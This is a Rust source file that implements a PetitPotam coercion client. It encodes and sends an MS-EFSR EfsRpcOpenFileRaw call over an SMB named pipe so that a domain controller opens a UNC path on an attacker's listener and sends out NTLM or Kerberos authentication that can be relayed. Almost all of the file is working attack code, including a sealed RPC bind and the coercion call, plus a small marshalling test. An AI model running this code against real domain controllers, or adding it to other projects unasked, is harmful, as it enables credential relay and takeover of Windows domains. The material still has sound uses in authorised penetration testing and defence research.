//! MS-EFSR coercion (PetitPotam) — `EfsRpcOpenFileRaw` forces the DC to open an attacker
//! UNC path, triggering outbound NTLM/Kerberos auth (relayable). Rides the SMB named-pipe
//! DCE/RPC transport; the EFSRPC interface is reachable on `\lsarpc` and `\efsrpc`.

use crate::ndr::NdrEncoder;
use crate::transport::SmbPipe;
use crate::{required_tail_u32, Result, Syntax};
use smb2_client::SmbClient;

/// EFSRPC interface (MS-EFSR), v1.0.
pub fn efsr_syntax() -> Syntax {
    Syntax::new("c681d488-d850-11d0-8c52-00c04fd90f7e", 1, 0)
}

pub const OPNUM_OPEN_FILE_RAW: u16 = 0;

/// EfsRpcOpenFileRaw (`FileName` is an input string, `Flags` is input) — `hContext` is output,
/// not marshaled.
pub fn encode_open_file_raw(unc: &str) -> Vec<u8> {
    let mut e = NdrEncoder::new();
    e.referent(); // FileName pointer
    e.conformant_varying_wstr(unc); // NUL-terminated wide string
    e.u32(0); // Flags
    e.into_bytes()
}

pub struct CoerceClient<'a> {
    pipe: SmbPipe<'a>,
    sealed: bool,
}

impl<'a> CoerceClient<'a> {
    /// Sealed bind (RPC packet-privacy). MS-EFSR 3.1 mandates PKT_PRIVACY, and Server 2016+
    /// enforces it — an unsealed bind reaches the server but every method call faults with
    /// `nca_s_fault_ndr`. Pass the same credentials the SMB session was opened with.
    pub async fn bind_sealed(
        client: &'a mut SmbClient,
        file_id: [u8; 16],
        domain: &str,
        user: &str,
        password: &str,
        host: &str,
    ) -> Result<Self> {
        let mut pipe = SmbPipe::new(client, file_id);
        pipe.bind_sealed(efsr_syntax(), domain, user, password, host)
            .await?;
        Ok(CoerceClient { pipe, sealed: true })
    }

    /// Fire EfsRpcOpenFileRaw at `\\listener\share\x`. Returns the EFSRPC status word — a
    /// non-fault response means the DC processed the call (coercion attempted). Full auth
    /// capture requires a relay/listener on the attacker host (out of tool scope).
    pub async fn coerce(&mut self, listener: &str) -> Result<u32> {
        let unc = format!("\\\\{listener}\\share\\efsrpc.txt");
        let resp = if self.sealed {
            self.pipe
                .call_sealed(OPNUM_OPEN_FILE_RAW, &encode_open_file_raw(&unc))
                .await?
        } else {
            self.pipe
                .call(OPNUM_OPEN_FILE_RAW, &encode_open_file_raw(&unc))
                .await?
        };
        // EfsRpcOpenFileRaw returns [out] handle (20) + NTSTATUS at the tail.
        required_tail_u32(&resp, "EfsRpcOpenFileRaw")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn open_file_raw_marshals_unc_and_flags() {
        let stub = encode_open_file_raw("\\\\10.0.0.1\\s\\x");
        // referent(4) then string; Flags is the trailing u32 = 0
        assert_ne!(u32::from_le_bytes(stub[0..4].try_into().unwrap()), 0); // referent nonzero
        assert_eq!(&stub[stub.len() - 4..], &[0, 0, 0, 0]); // Flags
    }
}
